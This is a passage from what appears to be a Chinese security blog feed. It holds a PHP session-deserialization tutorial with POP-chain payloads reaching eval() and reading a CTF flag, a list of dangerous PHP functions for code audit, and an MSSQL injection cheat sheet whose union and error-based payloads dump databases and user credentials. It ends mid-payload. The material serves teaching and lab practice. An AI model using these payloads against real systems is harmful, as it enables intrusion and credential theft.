class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mdzz</span>=<span class="string">&#x27;print_r(dirname(__FILE__));&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> OowoO();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$obj</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">|O:<span class="number">5</span>:<span class="string">&quot;OowoO&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;mdzz&quot;</span>;s:<span class="number">27</span>:<span class="string">&quot;print_r(dirname(__FILE__));&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210128112624.png"></p><ul><li>payload3:读取flag</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mdzz</span>=<span class="string">&#x27;print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> OowoO();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$obj</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">|O:<span class="number">5</span>:<span class="string">&quot;OowoO&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;mdzz&quot;</span>;s:<span class="number">88</span>:<span class="string">&quot;print_r(file_get_contents(&quot;</span>/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php<span class="string">&quot;));&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210128112920.png"></p><p>$flag=”CTF{4d96e37f4be998c50aa586de4ada354a}”;</p><h3 id="session反序列化POP"><a href="#session反序列化POP" class="headerlink" title="session反序列化POP"></a>session反序列化POP</h3><h4 id="实例1-普通POP"><a href="#实例1-普通POP" class="headerlink" title="实例1 - 普通POP"></a>实例1 - 普通POP</h4><p>首先需要对php.ini做配置</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">session.auto_start ＝ Off</span><br><span class="line"><span class="attr">session.serialize_handler</span> = php_serialize</span><br><span class="line"><span class="attr">session.upload_progress.cleanup</span> = <span class="number">0</span>ff</span><br></pre></td></tr></table></figure><ul><li>session.auto_start = on 表示PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()，这里需要关闭</li><li>session.serialize_handler = php_serialize 表示默认使用php_serialize引擎进行存储</li><li>session.upload_progress.cleanup = On 导致文件上传后，Session文件内容立即清空，这里需要关闭</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//4-5-1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_string(file_get_contents(basename(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])));            </span><br><span class="line"><span class="comment">//show_source(__FILE__);    </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;varr = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(file_exists(<span class="keyword">$this</span>-&gt;varr))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;文件&quot;</span>.<span class="keyword">$this</span>-&gt;varr.<span class="string">&quot;存在&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;这是foo1的析构函数&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo2</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;varr = <span class="string">&#x27;1234567890&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;obj = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;                    <span class="comment">//    类被当作字符串时被调用</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;obj-&gt;execute();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;varr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__desctuct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;这是foo2的析构函数&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo3</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;varr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__desctuct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;这是foo3的析构函数&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//4-5-2.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;./4-5-1.php&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> foo1();</span><br><span class="line"><span class="variable">$obj</span>-&gt;varr = <span class="string">&quot;phpinfo.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用思路就是去执行eval并控制varr参数，造成任意代码执行，现在开始分析POP链</p><ol><li><p>foo3类的execute没有被调用，foo2类的__toString()方法里调用了execute，所以第一步是把$this-&gt;obj赋值为foo3类的对象。然后现在去寻找怎么去执行这个__toString</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;obj = <span class="keyword">new</span> foo3();</span><br></pre></td></tr></table></figure></li><li><p>foo1类的__destruct()把$this-&gt;varr当做了字符串，所以这里把$this-&gt;varr赋值为foo2类的对象，就可以触发之前的__toString。POP链完成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;varr = <span class="keyword">new</span> foo2();</span><br></pre></td></tr></table></figure></li></ol><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo1</span></span>&#123;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">          <span class="keyword">$this</span>-&gt;varr = <span class="keyword">new</span> foo2();   </span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo2</span></span>&#123;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">          <span class="keyword">$this</span>-&gt;obj = <span class="keyword">new</span> foo3();</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo3</span></span>&#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="variable">$varr</span>=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> foo1();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$obj</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;foo1&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;varr&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;foo2&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;obj&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;foo3&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;varr&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//加上|</span></span><br><span class="line">|O:<span class="number">4</span>:<span class="string">&quot;foo1&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;varr&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;foo2&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;obj&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;foo3&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;varr&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>继续分析4-5-2.php:</p><ol><li>代码使用php引擎来读取session文件，而系统默认是使用php_serialize引擎来存储session文件，存在session反序列化漏洞</li><li>文件导入4-5-1.php，实例化foo1，只要构造payload然后反序列化就可以造成rce</li></ol><p>构造payload:</p><ol><li><p>创建upload2.html</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http://127.0.0.1/unserialize/4-5-2.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></li><li><p>在文件上传的时候使用burp抓包，在 PHP_SESSION_UPLOAD_PROGRESS 的 value 值中添加’ | ‘和序列化的字符串</p></li></ol><p><img src="https://lisianthus-images.oss-cn-hangzhou.aliyuncs.com/img/20210128134820.png"></p><h4 id="实例2-条件竞争POP"><a href="#实例2-条件竞争POP" class="headerlink" title="实例2 - 条件竞争POP"></a>实例2 - 条件竞争POP</h4><p>现在设置session.upload_progress.cleanup = On ，文件上传后，Session文件内容立即清空，这个时候就需要利用时间竞争来反序列化rce</p><p>文件上传的时候，抓取数据包，send to intruder模块，尝试大线程重放数据包</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>php反序列化从入门到放弃：<a href="https://www.cnblogs.com/bmjoker/p/13742666.html">https://www.cnblogs.com/bmjoker/p/13742666.html</a></p><p>PHP反序列化由浅入深：<a href="https://xz.aliyun.com/t/3674">https://xz.aliyun.com/t/3674</a></p><p>一篇文章带你深入理解漏洞之 PHP 反序列化漏洞：<a href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p><p>最通俗易懂的PHP反序列化原理分析：<a href="https://www.freebuf.com/articles/web/167721.html">https://www.freebuf.com/articles/web/167721.html</a></p><p>带你走进PHP session反序列化漏洞：<a href="https://xz.aliyun.com/t/6640#toc-2">https://xz.aliyun.com/t/6640#toc-2</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h2 id=&quot;0x1-前置基础知识&quot;&gt;&lt;a href=&quot;#0x1-前置基础知识&quot; class=&quot;headerlink&quot; title=&quot;0x1.前置基础知识&quot;&gt;&lt;/a&gt;0x1.前置基础知识&lt;/h2&gt;&lt;h3 id=&quot;类和对象&quot;&gt;&lt;a href=&quot;#类和对象</summary>
      
    
    
    
    
    <category term="反序列化" scheme="https://bstark.me/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>php安全函数绕过</title>
    <link href="https://bstark.me/posts/17844/"/>
    <id>https://bstark.me/posts/17844/</id>
    <published>2022-01-23T12:20:20.000Z</published>
    <updated>2022-03-07T02:57:07.477Z</updated>
    
    <content type="html"><![CDATA[<p>常见的PHP危险函数</p><p>SQL注入:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line">代码执行:</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">eval()、assert()、preg_replace()、create_function()</span><br><span class="line"></span><br><span class="line">array_map()、call_user_func()、call_user_func_array()，array_filter，usort，uasort()</span><br></pre></td></tr></table></figure><p>命令执行:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system()、exec()、passthru()、shell_exec()、popen()、proc_open()、pcntl_exec()</span><br></pre></td></tr></table></figure><p>xss:</p><p>xss漏洞关键就是寻找参数未过滤的输出函数:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo、printf、print、print_r、sprintf、die 、var_dump、 var_export</span><br></pre></td></tr></table></figure><p>安装环节</p><p>header 检测lock文件是否存在</p><p>header文件只跳转 后面代码还是会执行</p><h1 id="待补充————————"><a href="#待补充————————" class="headerlink" title="待补充————————"></a>待补充————————</h1><p>get_magic_quotes_runtime()    // php.ini文件</p><p>二次注入</p><p>mysql_escape_string()</p><p>二次注入</p><p>mysql_real_escape_string()</p><p>addslashes()</p><p>编码注入</p><p>1.将字符串转为16进制编码数据或使用char函数（十进制）进行转化（因为数据库会自动把16进制转化）<br>2.用注释符去掉输入密码部分如”–/*#”</p><p>二次注入</p><p>宽字节注入</p><p>htmlspecialchars()</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;常见的PHP危险函数&lt;/p&gt;
&lt;p&gt;SQL注入:&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span </summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://bstark.me/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>MSSQL注入及提权</title>
    <link href="https://bstark.me/posts/26454/"/>
    <id>https://bstark.me/posts/26454/</id>
    <published>2022-01-23T04:20:20.000Z</published>
    <updated>2022-02-18T05:31:50.916Z</updated>
    
    <content type="html"><![CDATA[<h2 id="权限控制"><a href="#权限控制" class="headerlink" title="权限控制"></a>权限控制</h2><ul><li><strong>固定服务器角色</strong></li></ul><table><thead><tr><th>固定服务器</th><th>角色说明</th></tr></thead><tbody><tr><td>sysadmin</td><td>执行SQLServer中的任何动作</td></tr><tr><td>serveradmin</td><td>配置服务器设置</td></tr><tr><td>setupadmin</td><td>安装复制和管理扩展过程</td></tr><tr><td>securityadmin</td><td>管理登录和CREATEDATABASE的权限以及阅读审计</td></tr><tr><td>processadmin</td><td>管理SQLServer进程</td></tr><tr><td>dbcreator</td><td>创建和修改数据库</td></tr><tr><td>diskadmin</td><td>管理磁盘文件</td></tr></tbody></table><ul><li><strong>固定数据库角色</strong></li></ul><table><thead><tr><th>固定数据库</th><th>角色说明</th></tr></thead><tbody><tr><td>db_owner</td><td>可以执行数据库中技术所有动作的用户</td></tr><tr><td>db_accessadmin</td><td>可以添加、删除用户的用户</td></tr><tr><td>db_datareader</td><td>可以查看所有数据库中用户表内数据的用户</td></tr><tr><td>db_datawriter</td><td>可以添加、修改或删除所有数据库中用户表内数据的用户</td></tr><tr><td>db_ddladmin</td><td>可以在数据库中执行所有DDL操作的用户</td></tr><tr><td>db_securityadmin</td><td>可以管理数据库中与安全权限有关所有动作的用户</td></tr><tr><td>db_backoperator</td><td>可以备份数据库的用户</td></tr><tr><td>db_denydatareader</td><td>不能看到数据库中任何数据的用户</td></tr><tr><td>db_denydatawriter</td><td>不能改变数据库中任何数据的用户</td></tr></tbody></table><h2 id="Mssql注入"><a href="#Mssql注入" class="headerlink" title="Mssql注入"></a>Mssql注入</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- # 注释符号</span></span><br><span class="line">;<span class="operator">%</span><span class="number">00</span>      注释符号</span><br><span class="line"><span class="comment">/* 注释符号</span></span><br><span class="line"><span class="comment">/**/</span>            空白字符</span><br><span class="line"><span class="number">01</span>,<span class="number">02</span>,<span class="number">03</span>,<span class="number">04</span>,<span class="number">05</span>,<span class="number">06</span>,<span class="number">07</span>,<span class="number">08</span>,<span class="number">09</span>,<span class="number">0</span>A,<span class="number">0</span>B,<span class="number">0</span>C,<span class="number">0</span>D,<span class="number">0</span>E,<span class="number">0</span>F,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">1</span>A,<span class="number">1</span>B,<span class="number">1</span>C,<span class="number">1</span>D,<span class="number">1</span>E,<span class="number">1</span>F,<span class="number">20</span>         空白字符</span><br><span class="line">@<span class="variable">@version</span>版本信息</span><br><span class="line">db_name()当前数据库名</span><br><span class="line">user_name()     当前用户名</span><br><span class="line">host_name()当前服务器名</span><br><span class="line">@<span class="variable">@servername</span>    当前服务器名</span><br><span class="line">;<span class="keyword">select</span> <span class="keyword">user</span>    查询是否支持多语句</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> info <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> host_name()<span class="operator">=</span>@<span class="variable">@servername</span>;<span class="comment">--&#x27;  判断是否站库分离</span></span><br></pre></td></tr></table></figure><ul><li><strong>注入的主要视图表</strong></li></ul><p>每个数据库下面都有一个视图表,需要跨库查需要前面加库名 如master.information_schema.tables</p><table><thead><tr><th>视图表</th><th>列名</th><th>说明</th></tr></thead><tbody><tr><td>master.dbo.sysdatabases</td><td>name 数据库名</td><td>SQL server中所有的数据库</td></tr><tr><td>[库名].dbo.Sysobjects</td><td>name、id、xtype=’U’</td><td>SQL server中当前用户数据库的表</td></tr><tr><td>[库名].dbo.Syscolumns</td><td>name、ID,id 是用 sysobjects 得到的表的 ID 号</td><td>SQLserver中当前用户数据库的列</td></tr><tr><td>sys.sql_logins</td><td></td><td>SQL server中所有的登录名</td></tr></tbody></table><ul><li><strong>注入的权限判断</strong><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> is_SRVROLEMEMBER(<span class="string">&#x27;sysadmin&#x27;</span>))</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> is_member(<span class="string">&#x27;db_owner&#x27;</span>))</span><br></pre></td></tr></table></figure></li><li><strong>判断是否为MSSQL数据库</strong><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sysobjects)      返回正常为mssql数据库</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> sysobjects)  返回正常为mssql数据库</span><br></pre></td></tr></table></figure></li></ul><h3 id="联合注入过程"><a href="#联合注入过程" class="headerlink" title="联合注入过程"></a>联合注入过程</h3><p>mssql联合注入我们一般不使用 数字占位，而是null.因为你使用数字占位可能会发生隐式转换</p><ol><li>获取当前数据库版本<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select top 1 1,2,@@version</span></span><br></pre></td></tr></table></figure></li><li>获取当前数据库名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select top 1 1,2,db_name() --</span></span><br></pre></td></tr></table></figure></li><li>获取所有数据库名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select top 1 1,2,name from master.sys.databases where name not in (select top 1 name from master.sys.database) --</span></span><br></pre></td></tr></table></figure></li><li>获取表名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test.dbo.sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;u&#x27;</span>; <span class="operator">/</span><span class="operator">/</span>查询数据库存在的表</span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select top 1 name from test.dbo.sysobjects where xtype=&#x27;</span>U<span class="string">&#x27; and name not in (select top 0 name from test.dbo.sysobjects) --</span></span><br></pre></td></tr></table></figure></li><li>获取列名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test.dbo.syscolumns <span class="keyword">where</span> id <span class="operator">=</span><span class="number">549576996</span>;   <span class="operator">/</span><span class="operator">/</span>sysobjects表查询到的表id</span><br><span class="line"><span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> <span class="number">22.</span>dbo.syscolumns <span class="keyword">where</span> id<span class="operator">=</span>(<span class="keyword">select</span> id <span class="keyword">from</span> aspcms.dbo.sysobjects <span class="keyword">where</span> name<span class="operator">=</span><span class="string">&#x27;jinke_user&#x27;</span>); </span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select top 1 name from  aspcms.dbo.syscolumns where id=(select id from aspcms.dbo.sysobjects where name=&#x27;</span>AspCms_User<span class="string">&#x27;) and name not in(select top 6 name from  aspcms.dbo.syscolumns where id=(select id from aspcms.dbo.sysobjects where name=&#x27;</span>AspCms_User<span class="string">&#x27;)) --</span></span><br></pre></td></tr></table></figure></li><li>获取数据<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select top 1 1,2,username,password from user where username not in (select top 1 username from user) and password not in(select top 1 password from user)--</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="报错注入过程"><a href="#报错注入过程" class="headerlink" title="报错注入过程"></a>报错注入过程</h3><ul><li><strong>xml path(‘’) 报错</strong></li></ul><ol><li>判断版本号<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> @<span class="variable">@version</span><span class="operator">&gt;</span><span class="number">0</span></span><br></pre></td></tr></table></figure></li><li>获取当前数据库&amp;当前用户名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> db_name<span class="operator">&gt;</span><span class="number">0</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> (<span class="keyword">select</span> db_name())<span 